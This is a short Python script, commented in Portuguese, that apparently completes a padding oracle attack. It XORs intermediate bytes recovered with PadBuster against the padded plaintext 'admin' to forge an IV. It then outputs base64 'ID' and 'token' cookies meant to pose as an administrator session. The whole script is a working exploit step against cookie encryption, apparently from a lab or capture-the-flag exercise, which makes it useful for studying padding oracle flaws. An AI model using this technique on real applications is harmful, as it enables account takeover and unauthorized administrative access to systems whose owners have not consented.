import base64

# Bytes intermediários obtidos na execução do PadBuster em modo de decriptação
intermediate_hex = "e1c5601fabeffbe30dab31d9acf95c1a"
intermediate_bytes = bytes.fromhex(intermediate_hex)

# Plaintext alvo com o padding correto
desired_plaintext = b'admin'
padding_len = 16 - len(desired_plaintext)
desired_plaintext_padded = desired_plaintext + bytes([padding_len]) * padding_len

# Cálculo do IV forjado através da operação XOR
forged_iv_bytes = bytearray()
for i in range(16):
    forged_iv_bytes.append(intermediate_bytes[i] ^ desired_plaintext_padded[i])

# O criptograma (cookie ID) pode ser um bloco nulo, pois foi a base do cálculo
ciphertext_bytes = b'\x00' * 16

# Codificação dos resultados para o formato de cookie
cookie_id = base64.b64encode(ciphertext_bytes).decode('utf-8')
cookie_token = base64.b64encode(forged_iv_bytes).decode('utf-8')

print(f"Cookie 'ID'    ->  {cookie_id}")
print(f"Cookie 'token' ->  {cookie_token}")
